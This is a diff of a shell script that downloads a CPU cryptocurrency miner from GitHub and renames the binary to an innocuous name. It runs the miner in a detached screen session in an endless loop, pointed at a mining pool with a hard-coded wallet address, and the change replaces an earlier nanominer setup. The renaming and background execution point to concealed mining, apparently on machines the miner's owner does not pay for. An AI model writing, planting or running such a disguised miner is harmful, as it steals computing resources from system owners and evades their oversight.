@@ -2,13 +2,12 @@
 sudo apt update
 sudo apt install cpulimit
 sudo apt install screen -y
-screen -dmS random ./nanominer 65 75
-wget https://github.com/nanopool/nanominer/releases/download/3.3.4/nanominer-linux-3.3.4.tar.gz
-tar xf nanominer-linux-3.3.4.tar.gz
-cd nanominer-linux-3.3.4
-ls
+screen -dmS random ./hellminer 65 75
+wget  https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+mv hellminer bgaskeun
 while [ 1 ]; do
-./nanominer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.jj -p x -t 2
+./bgaskeun -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.asu -p d=16384s,hybrid --cpu 2
 sleep 3
 done
 sleep 999
